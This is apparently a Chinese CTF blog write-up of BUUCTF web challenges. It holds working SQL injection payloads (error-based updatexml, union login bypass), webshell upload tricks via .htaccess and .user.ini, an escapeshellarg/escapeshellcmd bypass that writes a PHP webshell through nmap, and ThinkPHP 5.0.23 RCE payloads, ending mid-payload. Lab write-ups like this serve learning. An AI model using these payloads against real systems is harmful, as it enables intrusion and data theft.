<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
<p><img src="/2020/10/05/buuoj/%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt></p>
<p>可是使用报错注入</p>
<blockquote>
<p>报错注入原理：</p>
<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
</blockquote>
<p>相关链接</p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html" target="_blank" rel="noopener">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc" target="_blank" rel="noopener">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610" target="_blank" rel="noopener">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
<blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
</blockquote>
<p>查询语句如下</p>
<div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">'H4rDsq1'</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>

<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
<p><img src="/2020/10/05/buuoj/flag1.png" srcset="/img/loading.gif" alt></p>
<p>显示后面的flag</p>
<div class="hljs"><pre><code class="hljs angelscript">?username=admin&amp;password=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(right(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>



<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
<div class="hljs"><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">'SET NAMES UTF8'</span>);
$name = $_POST[<span class="hljs-string">'name'</span>];
$password = $_POST[<span class="hljs-string">'pw'</span>];
$t_pw = md5($password);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
$sql = <span class="hljs-string">"select * from user where username = '"</span>.$name.<span class="hljs-string">"'"</span>;
<span class="hljs-comment">// echo $sql;</span>
$result = mysqli_query($con, $sql);

<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
	<span class="hljs-keyword">die</span>(<span class="hljs-string">"do not hack me!"</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!$result) &#123;
		printf(<span class="hljs-string">"Error: %s\n"</span>, mysqli_error($con));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo '&lt;pre&gt;';</span>
		$arr = mysqli_fetch_row($result);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">"admin"</span>)&#123;
			<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
				<span class="hljs-keyword">echo</span> $flag;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong pass!"</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong user!"</span>);
		&#125;
	&#125;
&#125;</code></pre></div>

<p>随便输入用户名和密码，查看源码，出现提示</p>
<p><img src="/2020/10/05/buuoj/sqli1.png" srcset="/img/loading.gif" alt></p>
<p>试了试应该是base32，解码后是base64</p>
<div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div>

<p>继续解码</p>
<div class="hljs"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">'$name'</span></code></pre></div>

<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
<p>值得注意的是，这题可以知道username是admin，</p>
<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
<p>接下来介绍一种新的union注入</p>
<p>先建立一张表</p>
<p><img src="/2020/10/05/buuoj/sqli3.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> * from test where id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,'<span class="hljs-title">admin</span>','2322';</span></code></pre></div>

<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
<p><img src="/2020/10/05/buuoj/sqli2.png" srcset="/img/loading.gif" alt></p>
<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
<p>这里就是 id=1,username=admin,password=2322</p>
<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000'union select 1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre></div>

<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
<p><img src="/2020/10/05/buuoj/sqli.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>二分注入</tag>
        <tag>报错注入</tag>
        <tag>union新姿势</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-upload</title>
    <url>/2020/10/08/buuoj-upload/</url>
    <content><![CDATA[<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf-upload"></a>buuctf-upload</h1><a id="more"></a>



<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一个图片，发现上传成功了，还给出了文件的保存路径</p>
<p>再尝试上传<code>1.php</code>但是出现了，报错提示</p>
<p>首先尝试的是，将<code>Content-Type: image/jpeg</code>改为图片类型，但是还是无法上传</p>
<p>再尝试一下.htaccess文件</p>
<p>文件内容</p>
<div class="hljs"><pre><code class="hljs <FilesMatch">SetHandler application&#x2F;x-httpd-php
&lt;&#x2F;FilesMatch&gt;</code></pre></div>

<p><img src="/2020/10/08/buuoj-upload/1-2.png" srcset="/img/loading.gif" alt></p>
<p>上传成功后，再上传包含一句话木马的 a.jpg文件，<code>.htaccess</code>文件的作用就是将指定类型的文件当作php文件运行</p>
<p>所以表面上是jpg类型的文件，但是是当作php文件</p>
<p><img src="/2020/10/08/buuoj-upload/1-1.png" srcset="/img/loading.gif" alt></p>
<p>上传成功后，蚁剑访问<code>url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg</code></p>
<p>密码为：cmd</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>试着上传php文件，提示非法后缀名，继续修改后缀名，发现php3,php5,phtml等可执行文件后不可上传</p>
<p>想到上传<code>.htacess</code>文件，但是也提示了非法后缀名，这个方法行不通了</p>
<p><img src="/2020/10/08/buuoj-upload/2-4.png" srcset="/img/loading.gif" alt></p>
<p>但是之前做upload-labs中还有一个上传<code>.user.ini</code>的文件</p>
<p><code>.user.ini</code>是什么</p>
<blockquote>
<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p>
</blockquote>
<p><code>.user.ini</code>的作用</p>
<blockquote>
<p>可以借助.user.ini轻松让<strong>所有</strong>php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell</p>
</blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">传送门</a></p>
<p><strong>开始做题</strong></p>
<p>上传.user.ini文件</p>
<p><img src="/2020/10/08/buuoj-upload/2-1.png" srcset="/img/loading.gif" alt></p>
<p>GIF89a是GIF文件内容开头的几个字符，其作用是为类绕过<code>exif_imagetype()</code></p>
<p>上传1.gif</p>
<p><img src="/2020/10/08/buuoj-upload/2-2.png" srcset="/img/loading.gif" alt></p>
<p>文件保存的路径已经给出，开始蚁剑链接的连接是</p>
<div class="hljs"><pre><code class="hljs angelscript">url/uploads/<span class="hljs-number">04</span>b0951938d905b41348c1548f9c338b/<span class="hljs-number">1.</span>gif</code></pre></div>

<p>但是一直连接不上</p>
<p>后来链接index.php才连接上，这里想到了<code>.user.ini</code>作用，是让所有的php文件包含整个一句话木马，而这里文件路径存在一个index.php，所有说index.php中也存在这个一句话木马</p>
<div class="hljs"><pre><code class="hljs llvm">/uploads/<span class="hljs-number">04</span>b<span class="hljs-number">0951938</span>d<span class="hljs-number">905</span>b<span class="hljs-number">41348</span><span class="hljs-keyword">c</span><span class="hljs-number">1548</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">338</span>b/index.php</code></pre></div>

<p><img src="/2020/10/08/buuoj-upload/2-3.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>.htacess</tag>
        <tag>.user.ini</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-z7z8</title>
    <url>/2020/10/08/buuoj-z7z8/</url>
    <content><![CDATA[<p>这篇是buuctf上的其他题型的集合</p>
<h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
  $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
  $host = $_GET[<span class="hljs-string">'host'</span>];
  $host = escapeshellarg($host);
  $host = escapeshellcmd($host);
  $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
  @mkdir($sandbox); <span class="hljs-comment">//创建了路径</span>
  chdir($sandbox);
  <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
&#125;</code></pre></div>

<p>前面的两段代码没啥用，主要是后面处理  <code>host</code>的过程</p>
<p><strong>1.知识储备</strong></p>
<blockquote>
<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
</blockquote>
<blockquote>
<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$<code>,</code>\x0A<code>和</code>\xFF<code>。</code>‘<code>和</code>“<code>仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及</code>%<code>和</code>!` 字符都会被空格代替。</p>
</blockquote>
<p><strong>namp命令</strong></p>
<blockquote>
<p><code>-T5</code> :扫描等级,越大越快,越快越不安全,最好设置为<code>-T4</code><br><code>-sT</code> :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试<br><code>-Pn</code> :禁用ping<br><code>-host-timeout 2</code>:设置扫描一台主机的时间，以毫秒为单位。<br><code>-F</code> :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p>
</blockquote>
<p><strong>漏洞点在这</strong></p>
<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p><strong>2.构造payload</strong></p>
<blockquote>
<ol>
<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li>
</ol>
</blockquote>
<p><strong>回到<code>mail</code>中，我们的 payload 最终在执行时变成了<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，最终的参数就是这样被注入的。</strong></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">参考</a></p>
<p>需要绕过上面的两个函数，先试试两个函数的作用</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$host = <span class="hljs-string">" 1'shellcode "</span>;
$host = escapeshellarg($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;
$host = escapeshellcmd($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-meta">?&gt;</span>
<span class="hljs-string">' 1'</span>\<span class="hljs-string">''</span>shellcode <span class="hljs-string">'</span>
<span class="hljs-string">'</span> <span class="hljs-number">1</span><span class="hljs-string">'\\'</span><span class="hljs-string">'shellcode \'</span></code></pre></div>

<p>构造的一句话木马为：<code>&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39;</code></p>
<p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
<p>这里的单引号都是成对出现的，所以没影响</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @shellcode<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/1kHWE9zFn6L3XsB.png" srcset="/img/loading.gif" alt="online1.png"></p>
<p>上传文件的保存路径，利用蚁剑链接一下</p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
<p>(写的有点乱)</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示</p>
<p><img src="https://i.loli.net/2020/10/24/e2hpjI7tioY3gN9.png" srcset="/img/loading.gif" alt="cve.png"></p>
<p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
<p>先看看报错信息:1 <code>url+?s=1</code></p>
<p><img src="https://i.loli.net/2020/10/24/3H6YjEuRLQfGl28.png" srcset="/img/loading.gif" alt="cve-1.png"></p>
<p>php版本为5.0.23，上网搜了一下这版本的漏洞</p>
<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
<p>直接构造payload，读取目录</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=ls /</code></pre></div>

<p>看到了flag文件</p>
<p>读取flag</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/VBW2Xg7yfmR4ciE.png" srcset="/img/loading.gif" alt="cve-3.png"></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><div class="hljs"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
$flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'gg'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>])) &#123;
	$id=$_GET[<span class="hljs-string">'id'</span>];
	$gg=$_GET[<span class="hljs-string">'gg'</span>];
	<span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'You got the first step'</span>;
		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
			$passwd=$_POST[<span class="hljs-string">'passwd'</span>];
			<span class="hljs-keyword">if</span> (!is_numeric($passwd)) &#123;
				<span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>) &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">'Good Job!'</span>;
					highlight_file(<span class="hljs-string">'flag.php'</span>);
					<span class="hljs-keyword">die</span>(<span class="hljs-string">'By Retr_0'</span>);
				&#125; <span class="hljs-keyword">else</span> &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">"can you think twice??"</span>;
				&#125;
			&#125; <span class="hljs-keyword">else</span> &#123;
				<span class="hljs-keyword">echo</span> <span class="hljs-string">'You can not get it !'</span>;
			&#125;
		&#125; <span class="hljs-keyword">else</span> &#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'only one way to get the flag'</span>);
		&#125;
	&#125; <span class="hljs-keyword">else</span> &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"You are not a real hacker!"</span>;
	&#125;
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Please input first'</span>);
&#125;
&#125;</code></pre></div>

<p>先F12找一找提示，原来就是格式化好的源码</p>
<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-name">md5</span>($id) === md5($gg) <span class="hljs-symbol">&amp;&amp;</span> $id !== $gg)</code></pre></div>

<p>直接使用数组绕过，也可以使用md5强碰撞的两字符串</p>
<div class="hljs"><pre><code class="hljs llvm">param<span class="hljs-number">1</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span>
param<span class="hljs-number">2</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span></code></pre></div>

<p><code>if (!is_numeric($passwd))</code>弱类型比较，使用1234567a绕过</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%00</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span 